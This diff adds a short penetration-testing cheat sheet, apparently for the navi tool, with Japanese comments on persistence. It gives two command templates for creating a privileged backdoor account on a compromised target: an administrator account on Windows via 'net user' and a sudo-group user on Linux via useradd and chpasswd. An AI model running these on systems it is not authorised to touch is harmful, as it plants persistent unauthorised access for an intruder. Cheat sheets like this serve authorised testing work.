@@ -1,0 +1,10 @@
+% 永続化, net user
+
+# net user: 管理者のアカウントを作る（相手の Windows で。端末の管理者かドメインの管理者かを選ぶ）
+cmd /c "net user <new_user> <new_pass> /add <win_persist>"
+
+
+% 永続化, useradd
+
+# useradd: sudo できるユーザーを作る（相手の Linux で。root で）
+useradd -m -s /bin/bash -G sudo <new_user> && echo '<new_user>:<new_pass>' | chpasswd
